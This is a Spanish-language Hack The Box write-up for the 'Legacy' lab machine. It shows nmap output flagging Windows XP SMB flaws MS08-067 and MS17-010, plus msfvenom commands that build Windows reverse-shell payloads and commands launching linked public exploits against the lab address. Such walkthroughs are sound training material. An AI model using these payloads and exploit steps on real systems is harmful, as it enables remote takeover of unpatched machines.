# Legacy ![Avatar](https://www.hackthebox.eu/storage/avatars/60dc190c4c015cfe3a3aef9b5afca254_thumb.png)     

## Initial Scan

```nmap
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m50s, deviation: 2h07m16s, median: 4d22h57m50s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:57:05 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-08-02T21:04:14+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```
## Enumeration

Busquemos vulnerabilidades asociadas a los puertos abiertos
```bash
sudo nmap -p 445 --script vuln 10.10.10.4
```
```
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|_smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```

## Exploit

### MS17-010

Utilizaremos el script de send_and_execute de este repositorio
```web
https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
```
Generamos una reverse shell para windows en formato ejecutable
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f exe -a x86 — platform windows -o rev_shell.exe
```
Ejecutamos el script mencionado arriba
```bash
python2.7 send_and_execute.py 10.10.10.4 rev_shell.exe
```
### MS08-67

Utilizaremos el siguiente script para la explotación
```
https://github.com/andyacer/ms08_067
```
Generamos el payload necesario para la reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```
Sustituimos este en la parte correspondiente del exploit`y lo lanzamos
```
python ms08_067_2018.py 10.10.10.4 6 445
```
Y ya estaría

# Analisís de la intrusión
### CVE-2017-0144, MS17-010 , Eternalblue
La máquina objetivo presentaba la vulnerabilidad conocida como Eternalblue que permite RCE en la máquina objetivo.
### CVE-2008-4250 , MS08-67 ,Server Service Vulnerability
La máquina objetivo presentaba una vulnerabilidad que permitía RCE mediante una petición RPC maliciosa.
